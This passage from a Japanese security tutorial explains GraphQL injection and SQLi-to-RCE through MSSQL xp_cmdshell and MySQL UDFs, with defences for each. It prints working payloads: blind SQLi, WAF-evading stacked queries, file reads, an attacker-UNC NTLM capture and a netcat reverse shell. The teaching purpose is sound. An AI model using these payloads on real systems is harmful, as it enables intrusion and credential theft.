ここでバックエンドが `SELECT * FROM users WHERE name = '` + 引数 + `'` のような文字列結合でクエリを組み立てている場合、注入されたSQLがそのまま実行される。`pg_sleep(30)`はPostgreSQL固有の関数で、指定秒数だけクエリの応答を遅延させる。エラーメッセージがアプリケーション側で握りつぶされていても、レスポンス時間の差という「サイドチャネル」から注入の成否を判定できる点が、ブラインドSQLiの核心である。

> 出典: GraphQL Injection — PayloadsAllTheThings — https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/

なお、GraphQL経由ではSQLiだけでなくNoSQLi（前節の`$regex`など）も同様に発生しうる。GraphQLのresolver（フィールドへの問い合わせを実際のデータ取得処理へ橋渡しする関数）がMongoDBを叩く実装であれば、引数として渡したJSON文字列内に`$regex`演算子を仕込むことで、GraphQL経由のNoSQL Injectionが成立する。

```graphql
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}",
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
  {
    firstName lastName id patients{ssn}
  }
}
```

これはGraphQLが「クエリ言語」であって「注入対策そのもの」ではないことを端的に示す例である。GraphQLサーバーは受け取った引数文字列の中身を検証しないので、その文字列がどんなバックエンドのクエリ言語（SQL、MongoDBクエリ、LDAPフィルタなど）へ渡されるかによって、注入の「方言」が決まる。

#### 内省（introspection）による攻撃面の探索

GraphQLの大きな特徴は、スキーマそのものをクエリで問い合わせられる「内省（introspection）」機能である。`__schema`メタフィールドを使うと、公開されている全ての型・フィールド・引数・ディレクティブを列挙できる。

```graphql
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}
```

特定の型だけを調べる簡易版も使える。

```graphql
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

内省はGraphQLサーバーの標準機能であり、本番環境で無効化されていない限り誰でも使える。攻撃者はこれを使って「どのフィールドが文字列引数を受け取るか」を機械的に洗い出し、SQLi・NoSQLiの候補ポイントを絞り込む。テスターにとっても同じ手順が偵察の第一歩になる。基本的な偵察エンドポイントの例は以下の通りである。

```
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
```

> 出典: GraphQL Injection — PayloadsAllTheThings — https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/

#### テスト用ツール：InQLとGraphQLmap

- **InQL**（doyensec製、Burp Suite拡張）: GraphQLの内省結果を解析し、スキーマ内の全クエリ・ミューテーションを一覧化してテスト用リクエストを自動生成する。SQLmapに着想を得た設計で、クエリや変数へのペイロード注入による欠陥検出を自動化する。
- **GraphQLmap**（swisskyrepo製）: GraphQLエンドポイントに対して対話的にリクエストを送るスクリプティングエンジンで、ペンテスト用途に特化している。複数フィールド・複数ミューテーションにまたがる注入テストを自動化できる。

> 出典: GraphQL Injection — PayloadsAllTheThings — https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/

これらのツールは「GraphQLスキーマを内省で洗い出し、文字列引数を持つフィールドへ機械的にSQLi/NoSQLiペイロードを流し込む」という作業を自動化するものであり、手動での偵察→ペイロード注入という基本の流れを高速化するに過ぎない。原理を理解していれば、ツールなしでもBurp Suiteの通常のIntruder機能等で同じテストを再現できる。

#### バッチングによる防御回避

GraphQLの実装によっては、1回のHTTPリクエストに複数のクエリを配列で束ねる「バッチング」が許可されている。

```json
[
  {"query":"..."},
  {"query":"..."}
]
```

エイリアス（同じフィールドに別名を付けて複数回呼び出す機能）を使えば、1つのGraphQLクエリの中に複数のミューテーション呼び出しを埋め込むこともできる。

```graphql
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
}
```

これ自体はSQLiではないが、SQLiのブラインド抽出やブルートフォースを行う際に、リクエスト単位のレート制限を回避する手段として悪用されうる。1リクエストあたりの送信回数に制限を掛けているだけの防御は、バッチングを考慮しない限り無意味になる。

> 出典: GraphQL Injection — PayloadsAllTheThings — https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/

#### ケーススタディ：Praetorianによる金融系GraphQL APIでのSQLi発見

Praetorian社は、PostgreSQLをバックエンドに持つ金融データアプリケーションのGraphQL APIにおいて、実際にSQL Injectionを発見した事例を公開している。この事例は「GraphQLの向こうにSQLiが隠れる」ことの実証として、方法論・ペイロード・影響まで具体的に示されている点で価値が高い。

**発見の流れ**:

1. **偵察**: Burp Suiteでリクエストを傍受し、認証済みユーザーが「プロセス作成」機能を操作する際のGraphQLトラフィックを観察した。クライアントが生成した検索語（search term）をサーバーに渡す特定の関数が標的になった。
2. **最初のペイロード投入**: 検索語を`' OR 1=1--`に置き換えたところ、SQLエラーが返り、SQL Injectionが可能であることが確認された。
3. **時間ベースのブラインド抽出への切り替え**: エラーメッセージが常に得られるとは限らないため、チームはタイミングベースのブラインド手法に切り替えた。真の条件はレスポンスを遅延させ、偽の条件は即座に返る、という差分を利用する。

権限確認に使われた具体的なペイロードは以下の通りである。

```sql
';SELECT case when (SELECT current_setting('is_superuser'))='on'
then pg_sleep(25) end;--
```

このクエリは、現在のDB接続が`is_superuser`（PostgreSQLのスーパーユーザー権限）を持っているかどうかをCASE式で判定し、真であれば`pg_sleep(25)`で25秒遅延させる。25秒の遅延が発生しなかったことから、当該DB接続はスーパーユーザー権限では動いていないと判断できた（＝この経路からの直接的な特権昇格は難しいことが分かった）。`current_setting()`はPostgreSQLの設定値を取得する関数であり、このように「取得したい情報の真偽をpg_sleepの有無に変換する」のがPostgreSQL系の時間ベースブラインドSQLiの定石である。

**判明した影響**:

- **列挙能力**: ブラインドSQLiを使い、テーブル名・カラム名を1文字ずつ抽出することに成功した。
- **データ整合性リスク**: テスト用テーブル`cmd_exec`に対して`INSERT`・`UPDATE`・`DELETE`が実行可能であることを確認した。
- **RCEへの拡張可能性**: PostgreSQLの`CVE-2019-9193`（`COPY ... TO/FROM PROGRAM`構文を悪用してOSコマンドを実行できる問題）を、SQLiからRCE（Remote Code Execution）へエスカレーションしうる経路として言及している。これは第6章前半で扱うSQLi→RCEの実例そのものであり、GraphQL層を経由していても最終的な到達点はRDBMSのネイティブ機能に依存するという点を裏付けている。

**推奨される対策**: Praetorianは(1) バインドされた型付きパラメータを使うパラメータ化クエリ、(2) パラメータ化されたストアドプロシージャの慎重な利用、の2点を挙げている。これはJava・.NET・Perl・PHPなど言語を問わず適用できる原則であり、GraphQLというレイヤーが増えても、最終防衛線は結局「SQL文の構築方法」に帰着することを示している。

> 出典: Identifying SQL Injections in a GraphQL API — Praetorian — https://www.praetorian.com/blog/identifying-sql-injections-in-a-graphql-api/

### まとめ：抽象化レイヤーが変えるのは「攻撃面」であって「原理」ではない

本節で見た3つのレイヤー――ORM、NoSQL、GraphQL――に共通するのは以下の構造である。

1. **抽象化レイヤーは「安全な既定経路」を提供するが、それを使うかどうかは開発者次第**である。ORMのプレースホルダ、NoSQLドライバのBSON組み立て機能、GraphQLサーバーの型システムは、いずれも正しく使えば注入を防げる。しかし文字列結合という「近道」を取った瞬間、レイヤーの種類に関わらず同じ穴が開く。
2. **フィルタは対象言語の構文を知らなければ意味を持たない**。HTML用フィルタはJSON特殊文字（`{ } :`）を素通りさせ、SQL用フィルタはJavaScriptの構文やGraphQLのフィールド構造を意識していない。防御側は「最終的にどの言語のパーサへ値が渡るか」を起点に対策を設計する必要がある。
3. **攻撃面の発見手段はレイヤーごとに異なる**。ORMでは使用ライブラリとCVEの特定、NoSQLでは演算子キーの注入可否、GraphQLでは内省クエリによるスキーマ列挙が、それぞれの偵察の起点になる。しかし注入が成立した後のブラインド抽出手法（真偽差分、時間差分）は、SQLi・NoSQLiを通じてほぼ共通の原理で動く。
4. **最終的な到達点は変わらない**。GraphQLやORMを経由しても、バックエンドがRDBMSであればSQLiとしての影響（データ抽出・改ざん・場合によってはRCE）がそのまま生じる。レイヤーが増えるほど「どこで文字列が組み立てられているか」を追跡するテスターの負担は増えるが、脆弱性の根本原因は一貫して「信頼できない入力とクエリ構文の未分離」である。

## SQLi→RCE：MSSQL xp_cmdshellとMySQL UDF

SQLインジェクション（SQLi）の到達点は、多くの場合「データベースの中身を読む」ことだと思われがちです。しかし攻撃者にとっての本命は、そこからさらに一段深く踏み込み、**データベースサーバのOS上で任意コマンドを実行する（RCE：Remote Code Execution）**ことにあります。DBMSはOS上の一プロセスとして動いており、その権限でファイルを書いたり外部プログラムを起動したりできる「正規の機能」を備えています。この機能を攻撃者が乗っ取れば、SQLiは一気に「サーバ完全掌握」へと格上げされます。

本節では、その二大定番ルートを仕組みレベルで解説します。

- **Microsoft SQL Server（MSSQL）**：拡張ストアドプロシージャ `xp_cmdshell` を有効化してWindowsコマンドを実行する。
- **MySQL / MariaDB**：ユーザ定義関数（UDF：User Defined Function、DBに独自のネイティブ関数を追加する仕組み）である `lib_mysqludf_sys` を仕込み、`sys_exec` / `sys_eval` でOSコマンドを実行する。

いずれも前提となるのが、**スタックドクエリ（stacked queries：`;` で複数のSQL文を連結して一度に実行させる手法）**、そして**十分に高いDB権限**です。この2つが「なぜ必要か」も含めて見ていきます。

> **前提となる用語**
> - **拡張ストアドプロシージャ（Extended Stored Procedure, XP）**：MSSQLがC/C++で書かれたDLLの関数をSQLから呼び出せるようにした仕組み。`xp_` で始まる。SQL文法の外側、つまりOSネイティブコードへの「窓口」になる。
> - **UDF（User Defined Function）**：MySQLで、共有ライブラリ（`.so`／`.dll`）内のネイティブ関数をSQL関数として登録する仕組み。`CREATE FUNCTION ... SONAME '...'` で登録する。
> - **sink（シンク）**：入力が最終的に実行・解釈される危険な代入先。ここでは「OSのコマンドインタプリタ（`cmd.exe` や `/bin/sh`）」がsinkになる。

---

### 1. MSSQL：xp_cmdshell によるコマンド実行

#### 1.1 xp_cmdshell とは何か、なぜ危険か

`xp_cmdshell` は、MSSQLに標準で同梱される拡張ストアドプロシージャで、**SQL文からWindowsのシェルコマンドをそのまま実行できる**機能です。insidersecurity の解説では次のように定義されています。

> _xp_cmdshell_ is an extended stored procedure in Microsoft SQL Server that allows users to execute Windows shell commands from the SQL Server environment.

内部的には、`xp_cmdshell 'コマンド'` を呼ぶと、MSSQLのプロセス（`sqlservr.exe`）が子プロセスとして `cmd.exe /c コマンド` を起動します。ここで決定的に重要なのが、**起動される子プロセスは SQL Server サービスアカウントのセキュリティコンテキストを継承する**という点です。つまり「誰としてコマンドが動くか」はDBログインの権限ではなく、SQL Serverサービスが動いているOSアカウントで決まります。

insidersecurity は、実行コンテキストになり得るアカウントを次のように整理しています。

- **NT AUTHORITY\SYSTEM** … OS上の最強権限（完全な管理者）。古い構成や一部インストールで見られる。
- **NT SERVICE\MSSQLSERVER** … 仮想サービスアカウント。既定かつ限定的権限。
- **ドメインサービスアカウント** … 権限は構成次第。ドメイン内で横展開（ラテラルムーブメント）の起点になりやすい。
- **プロキシアカウント** … 意図的に低権限で実行させるためのオプション。

さらに権限モデルについて重要な補足があります。

> If the user is not a member of the _SysAdmin_ Role, the _xp_cmdshell_ will execute commands using the account name and password stored in the credential named _'xp_cmdshell_proxy_account'_.

つまり、呼び出したDBログインが **sysadmin ロール**であればSQL Serverサービスアカウントとして実行され、そうでなければ `xp_cmdshell_proxy_account` という資格情報として実行されます（プロキシが設定されていなければ非sysadminは実行不可）。攻撃で狙われるのは前者、すなわち**アプリが sysadmin 相当のDBユーザで接続しているケース**です。Webアプリが `sa` や sysadmin ロールのアカウントでDBに繋いでいると、SQLi一発でOSの高権限コマンド実行に化けます。これが「最小権限の原則」がDB接続でも死活的に重要な理由です。

> 出典: Technical Analysis of xp_cmdshell Exploitation in MS SQL — https://insidersecurity.co/exploitation-of-xp_cmdshell-in-ms-sql-critical-risks-how-to-defend/

#### 1.2 xp_cmdshell を有効化する（sp_configure）

`xp_cmdshell` は SQL Server 2005 以降、**既定で無効**になっています（2000年代前半のワーム被害を受けたセキュリティ強化の一環）。したがって攻撃者はまずこれを有効化する必要があります。有効化は `sp_configure` という設定用ストアドプロシージャで行います。ここで問題になるのが、`xp_cmdshell` は「詳細設定（advanced options）」に属するため、**先に詳細設定の表示・変更を許可**してから操作しなければならない点です。手順は次の通りです。

```sql
-- 1. 詳細オプションの変更を許可する
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 2. xp_cmdshell を有効化する
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 3. コマンドを実行する
EXEC master..xp_cmdshell 'whoami';
```

**なぜ `RECONFIGURE` が要るのか。** `sp_configure` は設定値を「構成値（config_value）」に書き込むだけで、実際に稼働中サーバへ反映（「実行値 run_value」への反映）するには `RECONFIGURE` が必要だからです。片方だけでは設定が効きません。また `master..xp_cmdshell` の `master..` は「masterデータベースのdefaultスキーマ（=dbo）」を指す省略記法で、`xp_cmdshell` の実体が master DB にあることを明示しています。

**なぜスタックドクエリが必要か。** 上記は複数のSQL文の連続実行です。SQLi経由でこれを流し込むには、脆弱な箇所で `;` による文連結が許される必要があります。MSSQL のドライバ（特にADO.NET系）は**スタックドクエリを許容する**ことが多く、これがMSSQLでSQLi→RCEが成立しやすい大きな理由です（MySQLの標準的なコネクタは既定でスタックドクエリを拒否することが多く、対照的）。実際のインジェクションでは、たとえば脆弱なパラメータに以下を流します。

```sql
1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; --
```

HackTricks には、WAF（Web Application Firewall）を回避しつつ同じことを行う、シングルクォートを二重化して `EXEC('...')` で包んだ実物ペイロードが載っています。

```sql
admin'exec('sp_configure''show advanced options'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

ここで `''` は文字列リテラル内のシングルクォートのエスケープ（`'` を表す）であり、`exec('文字列')` は**動的SQL**として文字列を実行させます。動的SQLで包む狙いは、`sp_configure` や `xp_cmdshell` といったシグネチャをWAFの静的検知から外しつつ、文字列連結で組み立て直すことにあります。

> 出典: MSSQL injection — HackTricks（公式ソース: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mssql-injection.md 、正規URL: https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection ）

> ⚠️ **未取得の資料**: HackTricks の正規URL `https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection` は自動取得できませんでした（理由: 302リダイレクトで `tollbit.hacktricks.wiki` の有料ミラーに転送され、HTTP 402 Payment Required でブロック）。**同一内容は HackTricks 公式GitHubリポジトリの原本 Markdown から取得済み**です。原文を直接確認したい場合は上記正規URL、または原本 `https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/sql-injection/mssql-injection.md` をご覧ください。

#### 1.3 xp_cmdshell が無効/削除されているとき：sp_OACreate（OLEオートメーション）

`xp_cmdshell` は監視・無効化の第一標的なので、防御側が潰していることもあります。その場合の代替として **OLE Automation（`sp_OACreate` 系）**があります。これはMSSQLがWindowsのCOMオブジェクトをインスタンス化・操作できる機能で、`WScript.Shell` などを掴めばコマンド実行に化けます。

```sql
-- OLE Automation を有効化
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- WScript.Shell を生成して Run でコマンド実行
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\o.txt';
```

> （以下は、この小節の `sp_OACreate` 例が今回取得したHackTricks原本には未掲載のため、一般知識に基づく補足解説です）
> `sp_OACreate` はCOMオブジェクトのハンドルを返し、`sp_OAMethod` でそのメソッドを呼びます。`Run` は同期実行だが標準出力を直接返さないため、上記のように一旦ファイルへリダイレクトし、後述の `OPENROWSET(BULK...)` 等で読み戻すのが定石です。これも「詳細オプション」に属するので `show advanced options` の先行有効化が要る点は `xp_cmdshell` と同じ仕組みです。

#### 1.4 コマンド実行に至らなくても危険：ファイル読取・NTLMリレー

sysadmin 権限がなくRCEに届かない場合でも、MSSQLには情報漏えい・認証情報奪取につながる機能が複数あります。HackTricks から実物を引用します。

**任意ファイルの読み取り（OPENROWSET + BULK）**

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/win.ini', SINGLE_CLOB) AS x;
```

`OPENROWSET(BULK ...)` はファイルを一括読み込みする機能で、`SINGLE_CLOB`（1つの文字LOBとして読む）を指定すると、指定ファイルの中身をそのままクエリ結果として返せます。設定ファイルや資格情報を含むファイルの窃取に使われます。

**NetNTLMハッシュの奪取（xp_dirtree / SMB強制認証）**

さらに、`OPENROWSET(BULK ...)` や `xp_dirtree` に**UNCパス（`\\attacker-ip\share`）**を渡すと、SQL ServerサービスアカウントがそのSMBサーバへ**自動的に認証を試みる**ため、攻撃者は待ち受けたSMBサーバで**NetNTLMハッシュ**を捕捉できます。HackTricks はこれを次のように説明しています。

> Can coerce SMB authentication, potentially leaking NetNTLM credentials of the service account.（`xp_dirtree` は TCP 445/SMB に限定される。代替として `xp_fileexist`, `xp_subdirs` も同様）

捕捉したハッシュはオフラインクラックするか、**NTLMリレー**でそのまま他サービスへ中継して権限昇格・横展開に使えます。「コマンドが1つも実行できなくても、DBが勝手に認証情報を漏らす」という点が、この攻撃の陰湿さです。

このほかHackTricksは、権限に応じたSSRF（サーバサイドリクエストフォージェリ）用の関数として、`fn_xe_file_target_read_file`（`VIEW SERVER STATE` / 2022+では `VIEW SERVER PERFORMANCE STATE` が必要）、`fn_get_audit_file`（`CONTROL SERVER` / 2022+では `VIEW SERVER SECURITY AUDIT`）、`fn_trace_gettable`（`CONTROL SERVER`）を挙げ、さらに `dbo` 権限があれば **CLR（.NETアセンブリ）**をロードして `WebClient` で任意HTTPリクエストを送れると述べています（バージョン・権限依存の高度な手口）。

> 出典: MSSQL injection — HackTricks — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

#### 1.5 MSSQL側の防御

insidersecurity の推奨をまとめます。仕組みと対応させて理解するのが肝心です。

- **不要なら xp_cmdshell を無効化**（既定で無効。`sp_configure 'xp_cmdshell',0`）。攻撃の入口そのものを塞ぐ。
- **SQL Serverサービスアカウントを最小権限に**。万一実行されても被害範囲（子プロセスの権限）を絞れる。`NT AUTHORITY\SYSTEM` での運用を避け、専用の低権限ドメインアカウント等にする。
- **アプリのDB接続を最小権限に**。`sa`/sysadmin での接続を避ければ、そもそも有効化操作ができない。
- **パラメータ化クエリ（プリペアドステートメント）**でSQLi自体を根絶。スタックドクエリの注入口を与えない。
- **包括的なログ・監視**（`sp_configure` 変更や `xp_cmdshell` 呼び出しの検知）、WAF導入、定期的な監査。

> 出典: Technical Analysis of xp_cmdshell Exploitation in MS SQL — https://insidersecurity.co/exploitation-of-xp_cmdshell-in-ms-sql-critical-risks-how-to-defend/

---

### 2. MySQL / MariaDB：UDF（lib_mysqludf_sys）によるコマンド実行

MSSQLの `xp_cmdshell` に相当する「標準のコマンド実行XP」は、MySQLには**存在しません**。そこで攻撃者は、**自前でネイティブ関数を注入する**という一段手の込んだ手口を取ります。それが `lib_mysqludf_sys` を使った **UDFインジェクション**です。

#### 2.1 攻撃チェーンの全体像

securitypentester.ninja が示す Linux での攻撃手順を、原文のSQLごと追います。全体は「①共有ライブラリをプラグインディレクトリに書き込む → ②その中の関数をUDFとして登録する → ③関数を呼んでコマンド実行」という3段構えです。

```sql
-- 前提: mysql データベースを使う
use mysql;

-- ① blob列を持つ一時テーブルを作る
CREATE TABLE root(line blob);

-- ② 事前にサーバ上へ置いた .so をDBに読み込み、プラグインディレクトリへ書き出す
INSERT INTO root values(load_file('/tmp/lib_mysqludf_sys.so'));
SELECT * FROM root into dumpfile '/usr/lib/lib_mysqludf_sys.so';

-- ③ .so 内の sys_exec を UDF として登録
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';

-- ④ リバースシェルを起動
SELECT sys_exec("nc 192.168.1.2 3128 -e /bin/bash");
```

各ステップの「なぜ」を分解します。

**なぜ `blob` テーブルを経由するのか。** 目的はライブラリのバイナリを**MySQLの権限で任意パスへ書き出す**ことです。`load_file()` はサーバ上のファイルをバイナリのまま読み込む関数、`INTO DUMPFILE` は**クエリ結果を無加工でファイルに書き出す**構文です（`INTO OUTFILE` は行区切りや文字エスケープを挟むためバイナリが壊れる。`DUMPFILE` は1行を生のまま書くのでバイナリ保存に適する）。バイナリを一旦 `blob` 列に格納し、それを `DUMPFILE` で吐き出すことで、shared object をビット単位で正確に配置できます。

**なぜプラグインディレクトリなのか。** `CREATE FUNCTION ... SONAME 'lib_mysqludf_sys.so'` は、MySQLがライブラリを**プラグインディレクトリ（`@@plugin_dir`、多くは `/usr/lib/mysql/plugin/` や上例の `/usr/lib/`）**からしか読み込まない仕様のため、そこに配置する必要があります（バージョン依存。MySQL 5.1以降、UDFライブラリはプラグインディレクトリ配下限定に厳格化された）。`@@plugin_dir` は `SELECT @@plugin_dir;` で確認します。

**なぜコマンドが実行できるのか。** `sys_exec` は `lib_mysqludf_sys` が提供するネイティブ関数で、その中身は後述の通り C の `system()` を直接呼びます。DB内の関数呼び出しが、そのまま OS のコマンドインタプリタ（sink）に到達するわけです。

**リバースシェルの意味。** `nc 192.168.1.2 3128 -e /bin/bash` は、攻撃者ホスト `192.168.1.2` のポート `3128` へ接続し、`-e /bin/bash` で `/bin/bash` を接続先に繋ぐ（＝攻撃者側から対話シェルが取れる）Netcatのリバースシェルです。実行権限は **MySQLサーバプロセスのアカウント**（多くは `mysql` ユーザ、設定不備なら `root`）になります。

**Windows版**も同様で、`.dll`（`lib_mysqludf_sys.dll` / `lib_mysqludf_sys_32.dll`）を `C:\Windows\System32\` 等へ書き出し、`sys_exec` を登録して、ユーザ作成やRDP有効化といったコマンドを実行します。DLLはターゲットのアーキテクチャ（32bit/64bit）に一致させる必要があります。

**前提条件（prerequisites）**は次の通りで、1つでも欠けると成立しません。

- **FILE権限**：`load_file` / `INTO DUMPFILE` はDBユーザに `FILE` 権限が必要。
- **書き込み可能なプラグインディレクトリ**：`INTO DUMPFILE` でそこへ書けること。
- **`secure_file_priv` の制約**：`SELECT @@secure_file_priv;` の値が空（`''`）ならどこでも読み書き可、特定ディレクトリ指定ならその範囲のみ、`NULL` なら **`load_file`/`OUTFILE`/`DUMPFILE` が全面禁止**（後述）。
- **アーキテクチャ一致**：`.so`/`.dll` がサーバのビット数と一致。

> 出典: MySQL UDF Injection — securitypentester.ninja — https://securitypentester.ninja/mysql-udf-injection/

#### 2.2 lib_mysqludf_sys が提供する関数（ソースを読む）

`lib_mysqludf_sys` の実体を、GitHubの原本ソース（`lib_mysqludf_sys.c`）で確認します。提供される関数は次の通りで、それぞれ C の標準関数を薄くラップしているだけ、という点が「なぜ動くか」の核心です。

| UDF関数 | 役割 | 内部実装 |
|---|---|---|
| `sys_exec` | コマンド文字列を実行し**終了ステータス**を返す | `system(args->args[0])` を直接呼ぶ |
| `sys_eval` | コマンドを実行し**標準出力**を返す | `popen(args->args[0], "r")` で実行し `fgets()` で出力回収 |
| `sys_get` | 環境変数の値を取得 | `getenv(args->args[0])` |
| `sys_set` | 環境変数を設定 | `SETENV` マクロ（Unixは `setenv()`、Windowsは `SetEnvironmentVariable()`） |

関数シグネチャ（原本 `lib_mysqludf_sys.c` より抜粋）:

```c
// コマンドを実行して終了コードを返す（内部で system() を呼ぶ）
my_ulonglong sys_exec(UDF_INIT *initid, UDF_ARGS *args,
                      char *is_null, char *error);

// コマンドを実行して標準出力を返す（内部で popen() を呼ぶ）
char* sys_eval(UDF_INIT *initid, UDF_ARGS *args, char* result,
               unsigned long* length, char *is_null, char *error);
```

**`sys_exec` と `sys_eval` の使い分け。** `sys_exec` は `system()` ラッパで、返るのは終了ステータス（整数）だけ。攻撃で「結果を画面で読みたい」ときは `popen()` ラッパの `sys_eval` を使うと標準出力がSQL結果として返ります。ブラインドSQLiのように出力が見えない状況では `sys_exec` でリバースシェルやファイル書き出しを行い、出力を別経路で回収します。

**インストール用SQL（原本 `lib_mysqludf_sys.sql`）** は次の通りで、5関数を一括登録します。攻撃者は必要な `sys_exec` だけを登録することも、この一式を流すこともあります。

```sql
DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
DROP FUNCTION IF EXISTS sys_get;
DROP FUNCTION IF EXISTS sys_set;
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;

CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_get  RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set  RETURNS int    SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS int    SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
```

`RETURNS` の型が関数の性質と対応している点に注目してください。`sys_exec` は終了コードなので `int`、`sys_eval`（標準出力）と `sys_get`（環境変数値）は `string` です。

> 出典: lib_mysqludf_sys（`lib_mysqludf_sys.c` / `lib_mysqludf_sys.sql`）— https://github.com/mysqludf/lib_mysqludf_sys

#### 2.3 なぜ MySQL の RCE は MSSQL より「面倒」なのか

同じSQLi→RCEでも、MySQLはMSSQLより成立条件が厳しいことが多く、その理由は仕組みに根ざしています。

1. **スタックドクエリの制約**：MySQLの多くのコネクタ（例：PHPの `mysqli_query()`）は**1リクエストで1文しか実行しない**ため、`; CREATE FUNCTION ...` を後続に付けても無視されます。UDF注入には、複数文実行を許すAPI（`multi_query`）や、`INTO DUMPFILE` 単体で完結する経路が必要です。逆にMSSQLはスタックドクエリが通りやすく、この差がRCE難易度に直結します。
2. **`secure_file_priv`**：MySQL 5.7.6 以降は既定で `secure_file_priv` が特定ディレクトリ（多くは空でない値）に設定され、さらにディストリのパッケージでは `NULL` に設定されていることもあります。`NULL` なら `load_file`/`INTO DUMPFILE` が**完全に無効**になり、ライブラリをプラグインディレクトリへ書き込む手段が断たれます。これが現代のMySQLでUDF注入が難しくなった最大要因です。
3. **プラグインディレクトリの書き込み権限**：`@@plugin_dir` は通常 `mysql` ユーザのみ書き込み可・rootが所有で、`secure_file_priv` がそこを許可していないと `DUMPFILE` できません。
4. **`FILE` 権限**：Webアプリ用DBユーザに `FILE` 権限が付いていることは本来まれで、付いていること自体が設定ミスです。

つまり、MySQL UDF注入が成立する環境は「`FILE`権限あり・`secure_file_priv`が空か緩い・プラグインディレクトリが書ける・複数文実行が通る」という**複数の設定不備が重なった状態**であり、裏を返せば、これらのいずれか一つを正すだけで攻撃を封じられます。

> （以下は本小節の設定依存性についての一般知識に基づく補足です。バージョン・年に依存するため対象を明記します：`secure_file_priv` の既定変更は MySQL 5.7.6（2015年）以降、`--secure-file-priv` の厳格化はディストリパッケージにより差があります。）

#### 2.4 MySQL側の防御

- **`FILE` 権限を付与しない**：アプリ用アカウントから剥奪すれば `load_file`/`DUMPFILE` が使えず、ライブラリを書き込めない。
- **`secure_file_priv` を `NULL` か厳格なパスに**：ファイル入出力を無効化、またはプラグインディレクトリと無関係な場所に限定する。
- **MySQLを非root・専用低権限アカウントで実行**：万一 `sys_exec` が通っても、コマンドは `mysql` ユーザ権限に留まり、`root` を直接奪われない。
- **プラグインディレクトリを書き込み不可に**：所有者・パーミッションを厳格化し、DBプロセスから書けないようにする。
- **プリペアドステートメント＋複数文実行の無効化**：SQLi自体を塞ぎ、コネクタの `multi_query` 相当を使わない。

---

### 3. まとめ：二つのルートの共通構造

MSSQLの `xp_cmdshell` と MySQLの `lib_mysqludf_sys` は、表面上まったく別物に見えますが、本質は同じ「**SQLの世界からOSネイティブコード（sink）への橋渡し機能を、攻撃者権限で起動する**」という一点に集約されます。

| 観点 | MSSQL (xp_cmdshell) | MySQL (UDF) |
|---|---|---|
| コマンド実行の実体 | 既存XPが `cmd.exe` を起動 | 自前 `.so`/`.dll` の `system()`/`popen()` |
| 事前準備 | `sp_configure` で有効化するだけ | ライブラリをプラグインディレクトリへ書込＋`CREATE FUNCTION` |
| 必要な高権限 | sysadmin ロール | `FILE`権限＋緩い`secure_file_priv` |
| スタックドクエリ | 通りやすい（成立しやすい） | 通りにくい（成立しにくい） |
| 実行アカウント | SQL Serverサービスアカウント（最悪SYSTEM） | mysqlプロセスのアカウント（最悪root） |
| 最重要の防御 | 機能無効化＋DB接続を最小権限に | `FILE`剥奪／`secure_file_priv`＝NULL |

いずれのルートでも、防御の核心は**「アプリのDB接続を高権限で行わない（最小権限の原則）」**と**「危険機能を既定で無効化・剥奪する」**の2点であり、そしてそもそもの入口である**SQLi をパラメータ化クエリで根絶する**ことが、最も上流かつ確実な対策です。SQLiが1つでも残っていれば、DBの正規機能が攻撃者にとっての「OSへの扉」になり得る——これが本節を貫く教訓です。

## PostgreSQL RCEとJSON WAFバイパス原典研究

SQLインジェクション（SQLi）は「データベースの中身を読み書きできる」で終わる脆弱性だと思われがちだが、DBMSは単なるデータ保管庫ではない。ファイルシステムへの読み書き、OSコマンドの起動、ネイティブコード（共有ライブラリ）のロードといった強力な機能を内部に持っており、条件が揃えばSQLiは**RCE（Remote Code Execution、リモートコード実行）**――攻撃者が標的サーバ上で任意のコマンドを実行できる最終段階――に直結する。

